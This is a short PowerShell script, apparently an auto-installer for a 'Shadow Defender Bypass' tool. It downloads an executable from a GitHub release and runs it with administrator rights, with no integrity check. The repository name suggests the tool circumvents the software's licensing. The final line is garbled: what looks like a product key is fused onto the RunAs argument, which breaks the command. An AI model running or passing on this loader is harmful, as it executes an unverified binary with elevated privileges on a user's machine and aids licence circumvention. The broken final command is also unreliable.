# Shadow Defender Tool Auto-Installer
$Repo       = "musika08/Shadow-Defender-Bypass-Installer"
$ExeName    = "ShadowDefenderTool.exe"
$DownloadUrl = "https://github.com/$Repo/releases/latest/download/$ExeName"
$TempPath   = Join-Path $env:TEMP $ExeName

Write-Host " [~] Fetching Shadow Defender Tool from GitHub..." -ForegroundColor Cyan

try {
    # Download the latest executable
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $TempPath -ErrorAction Stop
}
catch {
    Write-Error " [!] Download Failed. Please ensure a Release exists on the GitHub repo."
    exit
}

Write-Host " [+] Starting Installer..." -ForegroundColor Green
# Run as Admin
Start-Process -FilePath $TempPath -Verb RunAs8XKHG-HXTW7-QWNX4-5MDX7-4R7CZ